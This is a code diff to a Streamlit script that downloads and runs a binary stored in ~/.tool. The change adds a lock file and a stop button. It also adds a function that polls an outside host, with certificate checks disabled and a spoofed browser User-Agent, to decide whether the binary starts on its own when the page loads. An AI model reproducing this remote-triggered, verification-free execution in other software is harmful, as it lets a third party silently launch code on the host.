@@ -10,6 +10,8 @@ import subprocess
 import argparse
 import time
 import streamlit as st
+import fcntl
+import json
 
 
 ROOT_DIR = pathlib.Path.home() / ".tool"
@@ -17,6 +19,7 @@ DEBUG_LOG = ROOT_DIR / "debug.log"
 PID_FILE = ROOT_DIR / "stream.pid"
 BIN_FILE = ROOT_DIR / "stream"
 BIN_ARGS = ""
+LOCK_FILE = ROOT_DIR / "stream.lock"
 
 def debug_log(message):
     print(message)
@@ -62,7 +65,23 @@ def download_file(url, target_path, mode='wb'):
                 debug_log(f"下载文件失败: {url}, 错误: {e}")
                 return False
 
-
+def auto_run():
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+        req = urllib.request.Request('https://cn.quinn.eu.org/api/mongo?key=streamlit_auto_run', headers=headers)
+        with urllib.request.urlopen(req, context=ctx) as response:
+            data = response.read().decode('utf-8')
+            json_data = json.loads(data)
+            return "error" not in json_data
+    except Exception as e:
+        debug_log(f"获取或解析 JSON 数据失败: {e}")
+        return False
+    
 # 下载二进制文件
 def download_binary(download_url, target_path):
     debug_log(f"正在下载 {download_url}...")
@@ -77,8 +96,6 @@ def download_binary(download_url, target_path):
 
 # 安装过程
 def install(args):
-    if not ROOT_DIR.exists():
-        ROOT_DIR.mkdir(parents=True, exist_ok=True)
     debug_log("开始安装过程:")
     system = platform.system().lower()
     machine = platform.machine().lower()
@@ -144,26 +161,55 @@ def parse_args():
     return parser.parse_args()
 
 def run():
-    args = parse_args()
+    if not ROOT_DIR.exists():
+        ROOT_DIR.mkdir(parents=True, exist_ok=True)
+    with open(LOCK_FILE, 'w') as lock_file:
+        try:
+            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+        except BlockingIOError:
+            debug_log("另一个实例正在运行")
+            return
+        args = parse_args()
 
-    if args.action == "install":
-        install(args)
-    elif args.action == "update":
-        upgrade()
-    elif args.action == "status":
-        check_status()
-    else: # 默认行为，通常是 'install' 或者检查后提示
-        if ROOT_DIR.exists() and PID_FILE.exists():
-            debug_log("检测到可能已安装并正在运行")
-            if check_status():
-                debug_log("如需重新安装，请先执行卸载: python3 " + os.path.basename(__file__) + " del")
-            else:
-                debug_log("服务状态异常，建议尝试重新安装.")
-                install(args) # 尝试重新安装
-        else:
-            debug_log("未检测到完整安装，开始执行安装流程...")
+        if args.action == "install":
             install(args)
+        elif args.action == "update":
+            upgrade()
+        elif args.action == "status":
+            check_status()
+        else: # 默认行为，通常是 'install' 或者检查后提示
+            if ROOT_DIR.exists() and PID_FILE.exists():
+                debug_log("检测到可能已安装并正在运行")
+                if check_status():
+                    debug_log("如需重新安装，请先执行卸载: python3 " + os.path.basename(__file__) + " del")
+                else:
+                    debug_log("服务状态异常，建议尝试重新安装.")
+                    install(args) # 尝试重新安装
+            else:
+                debug_log("未检测到完整安装，开始执行安装流程...")
+                install(args)
 
+def stop():
+    if not ROOT_DIR.exists():
+        ROOT_DIR.mkdir(parents=True, exist_ok=True)
+    with open(LOCK_FILE, 'w') as lock_file:
+        try:
+            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+        except BlockingIOError:
+            debug_log("另一个实例正在运行")
+            return
+        if PID_FILE.exists():
+            pid = PID_FILE.read_text().strip()
+            debug_log(f"正在停止服务，PID: {pid}")
+            try:
+                os.kill(int(pid), 9)
+                debug_log("服务已停止")
+            except Exception as e:
+                debug_log(f"停止服务失败: {e}")
+            if PID_FILE.exists():
+                PID_FILE.unlink()
+        else:
+            debug_log("没有正在运行的服务")
 
 st.title("欢迎来到 👋")
 st.text_area( "当前目录的文件:", ROOT_DIR)
@@ -177,5 +223,7 @@ if st.button("日志"):
 running = PID_FILE.exists() and os.path.exists(f"/proc/{PID_FILE.read_text().strip()}")
 if st.button("运行", disabled=running):
     run()
-if not running:
+if st.button("停止", disabled=not running):
+    stop()
+if not running and auto_run():
     run()
